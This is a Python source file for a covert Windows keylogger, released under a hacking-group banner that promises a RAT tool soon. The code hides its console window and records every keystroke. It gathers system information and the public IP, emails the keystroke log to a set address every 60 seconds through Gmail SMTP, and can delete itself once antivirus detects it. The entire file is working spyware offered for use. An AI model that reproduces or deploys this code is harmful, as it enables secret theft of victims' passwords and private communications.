"""


          
  █████▒██▀███   ▄▄▄       ███▄    █  ██ ▄█▀    ▄████▄   ██▓  ██████  ▄████▄   ▒█████  
▓██   ▒▓██ ▒ ██▒▒████▄     ██ ▀█   █  ██▄█▒    ▒██▀ ▀█  ▓██▒▒██    ▒ ▒██▀ ▀█  ▒██▒  ██▒
▒████ ░▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒▓███▄░    ▒▓█    ▄ ▒██▒░ ▓██▄   ▒▓█    ▄ ▒██░  ██▒
░▓█▒  ░▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██ █▄    ▒▓▓▄ ▄██▒░██░  ▒   ██▒▒▓▓▄ ▄██▒▒██   ██░
░▒█░   ░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░▒██▒ █▄   ▒ ▓███▀ ░░██░▒██████▒▒▒ ▓███▀ ░░ ████▓▒░
 ▒ ░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▒ ▓▒   ░ ░▒ ▒  ░░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒░▒░▒░ 
 ░       ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒ ▒░     ░  ▒    ▒ ░░ ░▒  ░ ░  ░  ▒     ░ ▒ ▒░ 




                                        187 O N L I N E 
                                      twitter.com/187online
                                    RAT TOOL WILL BE SHARED SOON  
"""

import os
import smtplib
import threading
import subprocess
from pynput import keyboard
import win32console,win32gui,win32api
from email.mime.base import MIMEBase
from  email.mime.text import MIMEText


SET_SELF_DESTROY_FLAG = False  # When antıvırus software detect the malware.Malware deletes themself and reboot system

class MAIL: 
    
    EMAIL_ADDRESS =  ' ' #Your mail address 

    PASSWORD = ' ' #Your password

    DESTINATION_ADDRESS= ' ' # You want to send mail address
  
    SERVER =  smtplib.SMTP('smtp.gmail.com', 587)
    
    @staticmethod
    def msg(message: str) :
    
        return MIMEText(message,'plain','utf-8').as_string()
    
    @classmethod
    def Login(cls) -> None :
        
        cls.SERVER.ehlo()  
    
        cls.SERVER.starttls() 
            
        cls.SERVER.login(cls.EMAIL_ADDRESS,cls.PASSWORD)
        
        sys_info =  SYS.INFO() #Get system info and global ip address   
            
        message  =  MAIL.msg('Keylogger Activated\n\n'+sys_info)  #Get activate message and system info 
            
        cls.SERVER.sendmail(cls.EMAIL_ADDRESS,cls.DESTINATION_ADDRESS,message)
        
    @classmethod
    def send(cls,log) -> None  :

        message = MAIL.msg(log)
        
        cls.SERVER.sendmail(cls.EMAIL_ADDRESS,cls.DESTINATION_ADDRESS,message)
        
   
class HOOK :  

    LOGBUFFER = " "        
    
    @classmethod
    def kb_event(cls,key) :
    
        global curr_key

        try : 
            curr_key = str(key.char)
            
        except AttributeError :
            
            curr_key = '\t'+str(key)+'\t'

        cls.LOGBUFFER = cls.LOGBUFFER + curr_key
    
    @classmethod
    def send_events(cls):
        
        MAIL.send(cls.LOGBUFFER)
        
        th = threading.Timer(60,HOOK.send_events) #Default time interval 60 second 
       
        th.start()
                                       
class SYS : 
    
    @staticmethod
    def INFO() : 
        
        try : 
            
            system_info = subprocess.run('systeminfo',shell=True,capture_output=True)

            global_ip = subprocess.run('curl ifconfig.me',shell=True,capture_output=True)
        
            log = 'SYSTEM İNFO=>'+ '\n\n' + str(system_info.stdout)+'\n\n' +'GLOBAL IP =>' + str(global_ip.stdout)
            
            return log
        
        except : 
        
            return 'System info gathering failure'  
    
    @staticmethod
    def HIDE() : #Taken from Xenotix Keylogger # Hide console 
        
        window = win32console.GetConsoleWindow()
        
        win32gui.ShowWindow(window,0)
    
    @staticmethod
    def SELF_DESTROY() : 
            
        if SET_SELF_DESTROY_FLAG :  #Self destroy flag True or Flase.Your choice....
            
            error = win32api.GetLastError() # Takıng last Windows error.
            
            if error == 126 :  
                
                MAIL.send('Antivirus detect the keylogger.Keylogger will be deleted and system will be shutdown')
                
                try :
                    
                    os.remove(os.path.basename(__file__)) 
                   
                    win32api.AbortSystemShutdown(win32api.GetComputerName())
                       
                except : 
                    
                    pid = os.getpid()
                    
                    os.kill(pid,9)
                
                    os.remove(os.path.basename(__file__)) 
    
        else : 
            
            pass   

         
if __name__ == '__main__':

    SYS.HIDE()
    
    MAIL.Login()
    
    with keyboard.Listener(on_press= HOOK.kb_event) as Logger : 

        HOOK.send_events()
        
        SYS.SELF_DESTROY()
        
        Logger.join()

